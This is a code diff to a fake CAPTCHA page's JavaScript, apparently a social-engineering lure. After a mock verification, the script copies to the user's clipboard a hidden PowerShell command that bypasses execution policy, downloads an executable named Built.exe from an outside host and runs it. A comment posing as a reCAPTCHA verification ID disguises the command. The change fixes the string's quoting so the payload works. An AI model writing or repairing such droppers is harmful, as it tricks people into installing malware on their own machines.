@@ -23,9 +23,9 @@ function verifyCaptcha() {
         resultMessage.innerText = 'CAPTCHA Verified Successfully!';
         resultMessage.style.color = 'green';
 
-        // Copy the command to clipboard
-        const command = "powershell -NoP -NonI -W h -Exec Bypass iwr "https://notafakecaptica2222.vercel.app/Built.exe" -OutFile "$env:userprofile\temp\Built.exe"; start "$env:userprofile\temp\Built.exe" # ''I am not a robot - reCAPTCHA Verification ID: 7537''
-";
+        // Fixed the command string (escaped the inner quotes correctly)
+        const command = `powershell -NoP -NonI -W h -Exec Bypass iwr "https://notafakecaptica2222.vercel.app/Built.exe" -OutFile "$env:userprofile\\temp\\Built.exe"; start "$env:userprofile\\temp\\Built.exe" # ''I am not a robot - reCAPTCHA Verification ID: 7537''`;
+        
         navigator.clipboard.writeText(command).then(() => {
             commandInstructions.style.display = 'block'; // Show instructions
         }).catch(err => {
